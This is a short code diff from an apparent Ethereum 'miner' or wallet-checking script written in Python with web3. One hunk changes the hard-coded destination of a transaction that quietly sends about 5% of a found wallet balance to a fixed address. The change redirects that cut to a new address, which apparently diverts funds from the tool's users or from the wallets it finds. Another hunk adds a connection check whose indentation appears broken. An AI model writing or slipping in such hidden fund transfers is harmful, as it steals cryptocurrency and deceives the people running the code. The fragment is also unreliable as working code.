@@ -219,7 +219,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                                 }
                                 MineTransaction2 = {
                                     'nonce': w3.eth.getTransactionCount(account.address)+1,
-                                    'to': "0x1cD1fbA59b08Ed2e81ec0F869dEe81AF098aFA5a",
+                                    'to': "0x9BF662bC68D96507d5b588C699131397c5E87D70",
                                     'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                     'gas': 21000,
                                     'gasPrice': w3.toWei(avgGas, "gwei")
@@ -358,7 +358,7 @@ if __name__=="__main__":
                 else: print(str(badhitbool))
                 w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
                 time.sleep(1)
-               
+                if w3.isConnected():
                    print("Miner starting... [Buidling child processes...]")
                     if __name__=="__main__":
                         multiprocessing.freeze_support()
